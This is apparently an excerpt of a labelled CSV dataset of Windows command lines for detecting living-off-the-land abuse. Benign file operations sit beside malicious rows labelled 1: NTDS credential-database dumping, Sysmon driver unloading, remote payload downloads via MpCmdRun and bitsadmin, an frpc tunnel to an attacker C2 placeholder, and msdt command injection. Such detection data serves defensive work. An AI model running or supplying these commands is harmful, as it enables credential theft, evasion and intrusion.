+"certutil.exe -hashfile ""C:\Program Files\zvjsvoaoov.log"" SHA256",0,combined_lotl,895
+select {hbaport | iadapter | iportal | provider | subsystem | controller | port | drive | lun | tportal | target | tpgroup } [597],0,combined_lotl,896
+"fsutil devdrv setFiltersAllowed [[/f] /volume <volume path>] """"filter1, filter 2, ...""""",0,combined_lotl,897
+"powershell.exe -Command ""Get-ChildItem -Path C:\Users\Logs -Recurse | Select-Object FullName, Length""",0,combined_lotl,898
+"wmic.exe process call create ""ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\pro",1,combined_lotl,899
+mmc.exe -Embedding {PATH_ABSOLUTE:.msc},1,combined_lotl,900
+"del ""C:\AppData\nytaacwiju.dat"" /f /q",0,combined_lotl,901
+"move ""C:\Windows\Users\bzpwyjja.sys"" ""C:\AppData\Windows\ycozcedjuu.exe""",0,combined_lotl,902
+"move.exe ""C:\Temp\Temp\ctmue.sys"" ""D:\Logs\hgrnbk.txt""",0,combined_lotl,903
+"mkdir.exe ""C:\Windows\Logs""",0,combined_lotl,904
+"copy ""C:\Temp\Users\zyvuzastq.txt"" ""C:\Users\qqnm\Pictures\Pictures\zlhypuz.exe""",0,combined_lotl,905
+coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name,1,combined_lotl,906
+"VSIISExeLauncher.exe -p {PATH:.exe} -a ""{CMD:args}""",1,combined_lotl,907
+"C:\Windows\System32\fsutil.exe file layout ""D:\Users\sqbtro.dat""",0,combined_lotl,908
+"dir.exe ""D:\Windows\Temp"" /s /b",0,combined_lotl,909
+AppLauncher.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,910
+"del ""D:\Users\Temp\fnihzyn.log"" /f /q",0,combined_lotl,911
+del [/p] [/f] [/s] [/q] [/a[:]<attributes>] <names>,0,combined_lotl,912
+"fsutil.exe file layout ""D:\AppData\Temp\ecribw.txt""",0,combined_lotl,913
+replace drive=7,0,combined_lotl,914
+"type.exe ""D:\Users\pasqi.log""",0,combined_lotl,915
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Logs\okjcitsa.txt\"" \""D:\Users\xszq\Desktop\Pictures\yewduvqf.exe\"""" /sc daily /st 23:00",0,combined_lotl,916
+net.exe user pmqzdnvn /add,0,combined_lotl,917
+"certutil.exe -hashfile ""C:\AppData\Logs\prnag.dll"" SHA256",0,combined_lotl,918
+"C:\Windows\System32\mkdir.exe ""C:\Logs\Logs""",0,combined_lotl,919
+wscript //e:vbscript {PATH}:script.vbs,1,combined_lotl,920
+rem E and F.,0,combined_lotl,921
+replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A,1,combined_lotl,922
+"attrib +h ""D:\Temp\Users\ynbhst.sys""",0,combined_lotl,923
+"move ""D:\AppData\smylr.ini"" ""C:\Program Files\Program Files\jxmzxyak.log""",0,combined_lotl,924
+"icacls.exe ""C:\Windows\leocqmife.dat"" /grant Everyone:F",0,combined_lotl,925
+"attrib.exe +h ""C:\Logs\Temp\abxqgigaon.txt""",0,combined_lotl,926
+"certutil.exe -hashfile ""C:\Users\kbfgrksk\Documents\Pictures\revvofztgu.ini"" SHA256",0,combined_lotl,927
+"findstr /C:""HZWzp9HKSW7L"" ""D:\AppData\lhblpzuxj.exe""",0,combined_lotl,928
+detail volume,0,combined_lotl,929
+fltMC.exe unload SysmonDrv,1,combined_lotl,930
+cipher /w:{PATH_ABSOLUTE:folder},1,combined_lotl,931
+"copy ""D:\Logs\dvqrcwt.exe"" ""C:\Windows\equlnvlfkd.txt""",0,combined_lotl,932
+"certutil.exe -hashfile ""C:\Users\tybjjnsb.dll"" SHA256",0,combined_lotl,933
+net user inowyftg /add,0,combined_lotl,934
+net.exe user annnquvl /add,0,combined_lotl,935
+vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,1,combined_lotl,936
+ping 192.168.172.140,0,combined_lotl,937
+eventcreate [/s <computer> [/u <domain\user> [/p <password>]] {[/l {APPLICATION|SYSTEM}]|[/so <srcname>]} /t {ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT} /id <eventID> /d <description>,0,combined_lotl,938
+fondue.exe /enable-feature:<feature_name> [/caller-name:<program_name>] [/hide-ux:{all | rebootrequest}],0,combined_lotl,939
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""list all"" ""mount 1"" ""quit"" ""quit""",1,combined_lotl,940
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\dngsghlb\Documents\qvpjpxkgyl.dll\"" \""D:\Logs\Program Files\jtefem.exe\"""" /sc daily /st 23:00",0,combined_lotl,941
+C:\Program Files\icacls.exe config.ini /grant Everyone:R,0,combined_lotl,942
+"certutil -hashfile ""C:\AppData\AppData\rkozd.txt"" SHA256",0,combined_lotl,943
+c:\windows\syswow64\iscsicpl.exe,1,combined_lotl,944
+"move.exe ""D:\Users\ymtvq\Desktop\nuluu.log"" ""C:\Temp\Users\zlkdo.dll""",0,combined_lotl,945
+net.exe user rqfiujbi /add,0,combined_lotl,946
+"powershell.exe -Command ""Get-ChildItem -Path D:\Users\Temp -Recurse | Select-Object FullName, Length""",0,combined_lotl,947
+devtunnel.exe host -p 8080,1,combined_lotl,948
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\dgym\Downloads\jdfnhffrpl.dat\"" \""C:\Logs\lqlgy.log\"""" /sc daily /st 23:00",0,combined_lotl,949
+"mkdir.exe ""C:\AppData\Temp""",0,combined_lotl,950
+"C:\Windows\System32\certutil.exe -hashfile ""D:\Users\ijopqdt.ini"" SHA256",0,combined_lotl,951
+"copy.exe ""D:\Users\qyonvzp\Documents\cjkcp.log"" ""C:\Program Files\jdkzitfjl.log""",0,combined_lotl,952
+C:\Windows\net.exe user rmrbposn /add,0,combined_lotl,953
+ping.exe 192.168.88.82,0,combined_lotl,954
+"type.exe ""C:\Temp\Logs\gyhal.dat""",0,combined_lotl,955
+"certutil.exe -hashfile ""C:\Program Files\pwchjwbk.dat"" SHA256",0,combined_lotl,956
+"copy.exe ""D:\Windows\wrbjodj.dll"" ""D:\Logs\ndxak.dll""",0,combined_lotl,957
+unmask lun {all | none | [add] wwn=<hexadecimal_number> [;<hexadecimal_number> [;…]] | [add] initiator=<initiator>[;<initiator>[;…]]} [uninstall],0,combined_lotl,958
+MsoHtmEd.exe {REMOTEURL},1,combined_lotl,959
+"Get-EventLog security -instanceid 4624 -after
+{redacted date} | fl * | Out-File
+'C:\users\public\documents\user.dat'",1,combined_lotl,960
+echo QaKmE1Erib7a > C:\Users\pokkf\Pictures\aagfzrbdr.log,0,combined_lotl,961
+wbemtest.exe,1,combined_lotl,962
+"C:\Windows\certutil.exe -hashfile ""D:\Temp\Users\qrjjdlh.txt"" SHA256",0,combined_lotl,963
+net.exe localgroup Administrators kvaznlih /add,0,combined_lotl,964
+"C:\Windows\System32\type.exe ""D:\Windows\nmosaox.ini""",0,combined_lotl,965
+expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},1,combined_lotl,966
+"fsutil file layout ""C:\Users\AppData\ufsrqrxi.dll""",0,combined_lotl,967
+HH.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,968
+"attrib.exe +h ""D:\Users\gisdxb\Documents\zkpzbvyad.dll""",0,combined_lotl,969
+"wmic.exe process call create ""ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\pro",1,volttyphoon,970
+esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o,1,combined_lotl,971
+"type ""D:\Windows\Windows\kkpgdpytv.exe""",0,combined_lotl,972
+Remote.exe /s {PATH:.exe} anythinghere,1,combined_lotl,973
+"echo.exe %DATE% %TIME% >> ""D:\Temp\musyxduhzo.dll""",0,combined_lotl,974
+echo tlah4nnlVhiS > C:\Users\dhuutywi\Pictures\Pictures\ghovhuzpp.exe,0,combined_lotl,975
+ScriptRunner.exe -appvscript {PATH_SMB:.cmd},1,combined_lotl,976
+net localgroup Administrators uoazmtlt /add,0,combined_lotl,977
+D:\Windows\net.exe localgroup Administrators vwxgogpg /add,0,combined_lotl,978
+bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,1,combined_lotl,979
+net use Z: \\192.168.15.197\backup,0,combined_lotl,980
+ie4uinit.exe -BaseSettings,1,combined_lotl,981
+Register-cimprovider -path {PATH_ABSOLUTE:.dll},1,combined_lotl,982
+C:\Windows\net.exe localgroup Administrators rdzupevq /add,0,combined_lotl,983
+"findstr.exe /C:""0VMSR5nLkR7n"" ""C:\Logs\Logs\vtkpw.txt""",0,combined_lotl,984
+diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},1,combined_lotl,985
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\Users\kfujqfj.log\"" \""D:\Temp\detdlvj.exe\"""" /sc daily /st 23:00",0,combined_lotl,986
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\Windows\rrfpekt.exe\"" \""D:\Program Files\jvwmnljfb.sys\"""" /sc daily /st 23:00",0,combined_lotl,987
+fsutil.exe volume [dismount] D:\Windows,0,combined_lotl,988
+"attrib +h ""C:\Windows\AppData\wqgfsemija.dat""",0,combined_lotl,989
+net use Z: \\192.168.148.85\backup,0,combined_lotl,990
+net.exe user lcvaggfq /add,0,combined_lotl,991
+fsutil devdrv untrust [/f] C:\Windows\Temp,0,combined_lotl,992
+"copy.exe ""C:\Temp\mzyrd.dll"" ""D:\Logs\bbpzvcn.dat""",0,combined_lotl,993
+name [[ predicate ] action ]] [-i probe-id [[ predicate ] action ]] [ args ... ],0,combined_lotl,994
+"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""",1,combined_lotl,995
+net use Z: \\192.168.106.49\public,0,combined_lotl,996
+"findstr.exe /C:""DauJPJO5EjZK"" ""C:\Program Files\Users\dgvhiump.dll""",0,combined_lotl,997
+(ar??1991.* ap??1991.*),0,combined_lotl,998
+expose %systemvolumeshadow% p:,0,combined_lotl,999
+diskshadow/list/revert <shadowcopyID>,0,combined_lotl,1000
+"rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}",1,combined_lotl,1001
+rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,1,combined_lotl,1002
+C:\Windows\ping.exe 192.168.82.45,0,combined_lotl,1003
+"certutil -hashfile ""D:\Windows\Logs\nalcbikeu.exe"" SHA256",0,combined_lotl,1004
+net.exe use Z: \\192.168.207.14\backup,0,combined_lotl,1005
+"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}",1,combined_lotl,1006
+"findstr /C:""oDw9Y7JMxZbJ"" ""D:\Users\etzdtss\Pictures\Documents\rtwfzzdqw.exe""",0,combined_lotl,1007
+"echo %DATE% %TIME% >> ""D:\Windows\Program Files\ikrgirghr.txt""",0,combined_lotl,1008
+detail {hbaport | iadapter | iportal | provider | subsystem | controller | port | drive | lun | tportal | target | tpgroup} [verbose],0,combined_lotl,1009
+"copy ""C:\Users\vnxnvzy\Documents\Desktop\uodtoaty.txt"" ""C:\Temp\Program Files\mgebcsxr.dat""",0,combined_lotl,1010
+"certutil -hashfile ""D:\Temp\leuxaa.dll"" SHA256",0,combined_lotl,1011
+fsutil.exe devdrv trust [/f] C:\AppData\Users,0,combined_lotl,1012
+"C:\Windows\findstr.exe /C:""Xt6EgVJSxZoL"" ""D:\AppData\Temp\hlbebbhotx.log""",0,combined_lotl,1013
+C:\Windows\Temp\tmp\Active Directory\ntds.dit,1,combined_lotl,1014
+add volume <volume> [provider 6212b85c-29f3-45a6-a72d-aba4d9e40824],0,combined_lotl,1015
+ping.exe 192.168.53.245,0,combined_lotl,1016
+Excel.exe {REMOTEURL},1,combined_lotl,1017
+"rundll32.exe shell32.dll,#44 {PATH:.dll}",1,combined_lotl,1018
+fsutil usn [queryjournal] <volumepath>,0,combined_lotl,1019
+echo.exe jHoE1ha6gnkN > C:\Program Files\Program Files\vmuovwbkid.dll,0,combined_lotl,1020
+. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess {PATH:.ps1},1,combined_lotl,1021
+"rundll32.exe ""C:\Program Files\Windows Photo Viewer\PhotoViewer.dll"",ImageView_Fullscreen {REMOTEURL}",1,combined_lotl,1022
+"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",1,combined_lotl,1023
+cmd /c vssadmin create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp,1,combined_lotl,1024
+"attrib.exe +h ""C:\Users\gfgqn.log""",0,combined_lotl,1025
+"copy ""C:\Users\fgitplzkl.txt"" ""D:\Program Files\cuvgxlml.txt""",0,combined_lotl,1026
+C:\Windows\echo.exe TPGaF45bTTjo > C:\Windows\lcqrkxu.txt,0,combined_lotl,1027
+"type ""C:\Logs\Logs\aoxkmz.txt""",0,combined_lotl,1028
+MSAccess.exe {REMOTEURL},1,combined_lotl,1029
+"# Establishes a TCP tunnel to the attacker's server
+frpc tcp -s <C2_SERVER_IP>:<PORT> -t <AUTH_TOKEN> --ue --uc -l <LOCAL_PORT> -r <REMOTE_PORT>",1,combined_lotl,1030
+"D:\Windows\rmdir.exe ""D:\Users\krdgp\Pictures"" /s /q",0,combined_lotl,1031
+"certutil.exe -hashfile ""D:\Users\cfkh\Desktop\Documents\ujjvmy.dat"" SHA256",0,combined_lotl,1032
+detail partition,0,combined_lotl,1033
+"findstr /C:""UuR4kRakaTrt"" ""D:\Temp\cwunklua.dll""",0,combined_lotl,1034
+"ssh localhost ""{C:\Windows\System32\cmd.exe}""",1,combined_lotl,1035
+net.exe localgroup Administrators zcxfjtma /add,0,combined_lotl,1036
+"fsutil file layout ""C:\AppData\Windows\zgrbm.ini""",0,combined_lotl,1037
+Pester.bat ;{PATH:.exe},1,combined_lotl,1038
+"C:\Windows\System32\powershell.exe -Command ""Get-ChildItem -Path C:\Program Files\AppData -Recurse | Select-Object FullName, Length""",0,combined_lotl,1039
+certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll},1,combined_lotl,1040
+"findstr.exe /C:""s0p5iiRRYI5K"" ""D:\Program Files\Users\mttshqgloa.ini""",0,combined_lotl,1041
+explorer.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,1042
+"fsutil.exe file layout ""C:\Users\kzey\Documents\kcbshvnac.dat""",0,combined_lotl,1043
+"wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\",1,combined_lotl,1044
+"copy.exe ""D:\Temp\Windows\wbyirpz.txt"" ""C:\Users\nurkqno\Downloads\beyibgnju.dat""",0,combined_lotl,1045
+"rmdir.exe ""C:\Windows\AppData"" /s /q",0,combined_lotl,1046
+"del ""C:\AppData\Temp\envshl.txt"" /f /q",0,combined_lotl,1047
+"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",1,combined_lotl,1048
+net.exe user nrlvqmqp /add,0,combined_lotl,1049
+"echo %DATE% %TIME% >> ""C:\Users\ugcd\Downloads\Desktop\vovaw.sys""",0,combined_lotl,1050
+"certutil.exe -hashfile ""D:\Windows\Program Files\yoabcwh.sys"" SHA256",0,combined_lotl,1051
+net.exe use Z: \\192.168.252.250\data,0,combined_lotl,1052
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\dkzztqa.log\"" \""C:\Windows\Windows\barobe.log\"""" /sc daily /st 23:00",0,combined_lotl,1053
+procdump.exe -md {PATH:.dll} foobar,1,combined_lotl,1054
+\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt,1,combined_lotl,1055
+certutil -encode {PATH} {PATH:.base64},1,combined_lotl,1056
+"type ""D:\AppData\ykbkffih.dll""",0,combined_lotl,1057
+pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,1,combined_lotl,1058
+ping.exe 192.168.181.158,0,combined_lotl,1059
+"powershell.exe -Command ""Get-ChildItem -Path C:\Users\icpghzfp\Downloads\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,1060
+"del ""C:\Logs\AppData\vbldydo.dat"" /f /q",0,combined_lotl,1061
+pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct},1,combined_lotl,1062
+VSLaunchBrowser.exe .exe {PATH_SMB},1,combined_lotl,1063
+"C:\Windows\certutil.exe -hashfile ""C:\Logs\tzesjgpo.log"" SHA256",0,combined_lotl,1064
+net.exe localgroup Administrators udjmlxhh /add,0,combined_lotl,1065
+ping 192.168.254.25,0,combined_lotl,1066
+. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke {CMD},1,combined_lotl,1067
+"del ""D:\Users\tbrlqmyd\Documents\gscjkchyz.txt"" /f /q",0,combined_lotl,1068
+"dir.exe ""D:\Users\Windows"" /s /b",0,combined_lotl,1069
+net.exe localgroup Administrators service /add,0,combined_lotl,1070
+online disk,0,combined_lotl,1071
+ping.exe 192.168.224.75,0,combined_lotl,1072
+C:\Windows\certutil.exe -decodehex {PATH:.hex} {PATH},1,combined_lotl,1073
+net localgroup Administrators jigqsvhx /add,0,combined_lotl,1074
+"powershell.exe -Command ""Get-ChildItem -Path C:\Users\rhee\Pictures\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,1075
+"icacls.exe ""D:\Temp\AppData\vunfguxjh.ini"" /grant Everyone:F",0,combined_lotl,1076
+"certutil.exe -hashfile ""D:\Windows\Users\etkcrosk.ini"" SHA256",0,combined_lotl,1077
+"move ""C:\Windows\Program Files\bgptiirr.txt"" ""D:\Users\zutxyxaqx.txt""",0,combined_lotl,1078
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Logs\AppData\gcefahy.exe\"" \""D:\Windows\vpzlaa.log\"""" /sc daily /st 23:00",0,combined_lotl,1079
+"attrib.exe +h ""D:\Windows\bmstgbhnh.txt""",0,combined_lotl,1080
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\lmnexhgzv.exe\"" \""D:\Temp\qbwmnmfyu.dll\"""" /sc daily /st 23:00",0,combined_lotl,1081
+net user gsbnjuft /add,0,combined_lotl,1082
+net.exe use Z: \\192.168.149.224\data,0,combined_lotl,1083
+"icacls.exe ""C:\Users\xiziuzcv\Downloads\Desktop\eeejp.dll"" /grant Everyone:F",0,combined_lotl,1084
+"fsutil.exe file layout ""D:\Program Files\xkfdchkx.dat""",0,combined_lotl,1085
+"findstr.exe /C:""XCM75tXVeAQX"" ""C:\Users\Program Files\sjwwotukn.txt""",0,combined_lotl,1086
+net localgroup Administrators yuyvzpzh /add,0,combined_lotl,1087
+squirrel.exe --update {REMOTEURL},1,combined_lotl,1088
+"dir ""C:\Users\vuatftzs\Downloads\Pictures"" /s /b",0,combined_lotl,1089
+echo.exe hf51fE8joaCt > C:\Program Files\gbfulufrce.log,0,combined_lotl,1090
+"type.exe ""D:\Temp\Users\bxkcwxdtor.txt""",0,combined_lotl,1091
+net.exe use Z: \\192.168.174.120\data,0,combined_lotl,1092
+"powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()""",1,combined_lotl,1093
+ConfigSecurityPolicy.exe {REMOTEURL},1,combined_lotl,1094
+"del ""D:\Users\Windows\elvtkzgn.exe"" /f /q",0,combined_lotl,1095
+fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE},1,combined_lotl,1096
+windbg.exe -g {CMD},1,combined_lotl,1097
+net.exe use Z: \\192.168.225.66\backup,0,combined_lotl,1098
+PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder},1,combined_lotl,1099
+rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM,1,combined_lotl,1100
+"fsutil file layout ""C:\Program Files\xxuxd.txt""",0,combined_lotl,1101
+wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe},1,combined_lotl,1102
+xcopy.exe \customer h:\public\address /s /e /k /p /i,0,volttyphoon,1103
+dotnet.exe msbuild {PATH:.csproj},1,combined_lotl,1104
+"dir ""C:\AppData\Users"" /s /b",0,combined_lotl,1105
+"mkdir.exe ""D:\Users\brtob\Documents""",0,combined_lotl,1106
+"echo.exe %DATE% %TIME% >> ""C:\Temp\Program Files\fzbhx.txt""",0,combined_lotl,1107
+C:\Windows\System32\net.exe use Z: \\192.168.141.209\data,0,combined_lotl,1108
+SettingSyncHost -LoadAndRunDiagScript {PATH:.exe},1,combined_lotl,1109
+"certutil.exe -hashfile ""C:\Temp\cqwacdr.ini"" SHA256",0,combined_lotl,1110
+"attrib +h ""D:\Users\idmsdvc.exe""",0,combined_lotl,1111
+"C:\Windows\attrib.exe +h ""D:\Temp\bftxyvsh.dat""",0,combined_lotl,1112
+net.exe user ftfjzrco /add,0,combined_lotl,1113
+"echo.exe %DATE% %TIME% >> ""C:\Users\kpezmebi\Documents\Documents\taibwf.dat""",0,combined_lotl,1114
+echo Y12esJSp2nJm > C:\Program Files\rixmfoswsk.dat,0,combined_lotl,1115
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Temp\wajvsykj.ini\"" \""C:\Windows\mqgsdkky.dll\"""" /sc daily /st 23:00",0,combined_lotl,1116
+"del ""C:\Users\sfwt\Downloads\gcyqbjvy.log"" /f /q",0,combined_lotl,1117
+activate instance ntds ifm,0,volttyphoon,1118
+echo HYnbYvZDQoq2 > D:\Logs\wswnsmirb.ini,0,combined_lotl,1119
+C:\Windows\System32\net.exe user fqadwmmq /add,0,combined_lotl,1120
+"copy ""C:\Users\Windows\gcagiqtkh.log"" ""C:\AppData\oqivdtzvel.exe""",0,combined_lotl,1121
+"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""C:\Program Files\AppData\olrtf.dll""",0,combined_lotl,1122
+ECMangen.exe {REMOTEURL},1,combined_lotl,1123
+"attrib.exe +h ""D:\Logs\ujoppvp.dat""",0,combined_lotl,1124
+"findstr /C:""M3Zy64EbfnUz"" ""D:\Logs\qbyail.exe""",0,combined_lotl,1125
+"findstr /C:""OJsDxhcsffir"" ""C:\Logs\Temp\yxetffccap.txt""",0,combined_lotl,1126
+refresh provider,0,combined_lotl,1127
+MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe,1,combined_lotl,1128
+"echo.exe %DATE% %TIME% >> ""D:\AppData\iztfnhq.log""",0,combined_lotl,1129
+bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,1,combined_lotl,1130
+"findstr.exe /C:""xLm3XTlXKKQN"" ""D:\Logs\Temp\ncxkikkzyq.ini""",0,combined_lotl,1131
+"C:\Windows\fsutil.exe file layout ""D:\Users\axjq\Pictures\rrldam.dat""",0,combined_lotl,1132
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\mwzwld.ini\"" \""C:\AppData\cyxvf.dll\"""" /sc daily /st 23:00",0,combined_lotl,1133
+"findstr /C:""v0p1AgC9eHzx"" ""D:\Temp\htxwr.exe""",0,combined_lotl,1134
+C:\Windows\System32\dir.exe C:\Temp,0,combined_lotl,1135
+"icacls.exe ""D:\Users\snjdfreu\Documents\thvsu.dll"" /grant Everyone:F",0,combined_lotl,1136
+"echo %DATE% %TIME% >> ""C:\Users\ejyit\Documents\Downloads\zrrpwwoju.log""",0,combined_lotl,1137
+"copy.exe ""D:\Windows\ajnhwyf.sys"" ""C:\Users\crfqrqe\Documents\Pictures\uwxvzqtdl.dat""",0,combined_lotl,1138
+wab.exe,1,combined_lotl,1139
+"rmdir.exe ""C:\Windows\Users"" /s /q",0,combined_lotl,1140
+ping 192.168.165.96,0,combined_lotl,1141
+"findstr.exe /C:""eT5dB4MHdVeD"" ""C:\Temp\Temp\asuwlw.dat""",0,combined_lotl,1142
+C:\Windows\System32\ping.exe 192.168.220.186,0,combined_lotl,1143
+Update.exe --download {REMOTEURL},1,combined_lotl,1144
+"findstr.exe /C:""XjGDkacHLrny"" ""D:\Logs\Program Files\jihxvtx.txt""",0,combined_lotl,1145
+regasm.exe /U {PATH:.dll},1,combined_lotl,1146
+"certutil -hashfile ""C:\Program Files\okdubbkavh.exe"" SHA256",0,combined_lotl,1147
+"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""",1,combined_lotl,1148
+SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat},1,combined_lotl,1149
+"powershell -Command ""Get-ChildItem -Path D:\Users\Logs -Recurse | Select-Object FullName, Length""",0,combined_lotl,1150
+"attrib +h ""C:\Logs\laaputwwvr.txt""",0,combined_lotl,1151
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Windows\qguoedqkb.log\"" \""D:\Program Files\Users\sbgwmi.dat\"""" /sc daily /st 23:00",0,combined_lotl,1152
+"echo.exe %DATE% %TIME% >> ""D:\Windows\tbdfbmufw.sys""",0,combined_lotl,1153
+start ms-appinstaller://?source={REMOTEURL:.exe},1,combined_lotl,1154
+findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe,1,combined_lotl,1155
+cmstp.exe /ni /s {PATH_ABSOLUTE:.inf},1,combined_lotl,1156
+ping 192.168.230.65,0,combined_lotl,1157
+"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""",1,combined_lotl,1158
+"move ""D:\Program Files\Program Files\sunou.exe"" ""D:\Program Files\Users\bnlrlspaps.ini""",0,combined_lotl,1159
+"C:\Windows\System32\attrib.exe +h ""D:\Program Files\Temp\cxesz.sys""",0,combined_lotl,1160
+net localgroup Administrators evfhrzpg /add,0,combined_lotl,1161
+"""C:\pstools\psexec.exe"" {REDACTED} -s cmd /c ""cmd.exe /c netsh
+interface portproxy delete v4tov4 listenaddress=0.0.0.0
+listenport=9999",1,combined_lotl,1162
+"move.exe ""C:\Windows\Temp\xacir.log"" ""C:\Logs\Logs\zflartl.dat""",0,combined_lotl,1163
+"certutil -hashfile ""C:\Users\Program Files\ztordbie.exe"" SHA256",0,combined_lotl,1164
+tar -xf {PATH_SMB:.tar},1,combined_lotl,1165
+msiexec /quiet /i {PATH:.msi},1,combined_lotl,1166
+"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\"" q q",1,combined_lotl,1167
+C:\Windows\net.exe user uyzwultt /add,0,combined_lotl,1168
+"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",1,combined_lotl,1169
+"powershell.exe -Command ""Get-ChildItem -Path D:\Users\bmgfogln\Documents\Desktop -Recurse | Select-Object FullName, Length""",0,combined_lotl,1170
+net.exe localgroup Administrators odqhpbsz /add,0,combined_lotl,1171
+"fsutil.exe file layout ""C:\Logs\rxheguolq.ini""",0,combined_lotl,1172
+for {%% | %}<variable> in (<set>) do <command> [<commandlineoptions>],0,combined_lotl,1173
+echo.exe 8J7Og2UQIO5I > C:\Windows\ycmmmls.ini,0,combined_lotl,1174
+%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,1,combined_lotl,1175
+"type ""D:\Temp\qvtuec.ini""",0,combined_lotl,1176
+net.exe user mliimpjg /add,0,combined_lotl,1177
+"findstr.exe /C:""4tNo5PUQ0DBo"" ""C:\Program Files\qrvpgds.ini""",0,combined_lotl,1178
+diantz /f {PATH:.ddf},1,combined_lotl,1179
+"move.exe ""C:\Logs\AppData\obnmhcgnrx.ini"" ""D:\Windows\gjouivhhu.ini""",0,combined_lotl,1180
+InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll},1,combined_lotl,1181
+"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta",1,combined_lotl,1182
+rescan,0,combined_lotl,1183
+"D:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",1,combined_lotl,1184
+"echo %DATE% %TIME% >> ""D:\Program Files\ptkicucqvg.dat""",0,combined_lotl,1185
+Powerpnt.exe {REMOTEURL},1,combined_lotl,1186
+regedit {PATH_ABSOLUTE}:regfile.reg.exe,1,combined_lotl,1187
+certutil.exe -URL {REMOTEURL:.exe},1,combined_lotl,1188
+print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,1189
+E:\Windows\fsutil.exe volume [querycluster] C:\Logs\Users <cluster> [<cluster>] …,0,combined_lotl,1190
+"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Users\xujmxaa\Desktop\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,1191
+net use Z: \\192.168.28.157\public,0,combined_lotl,1192
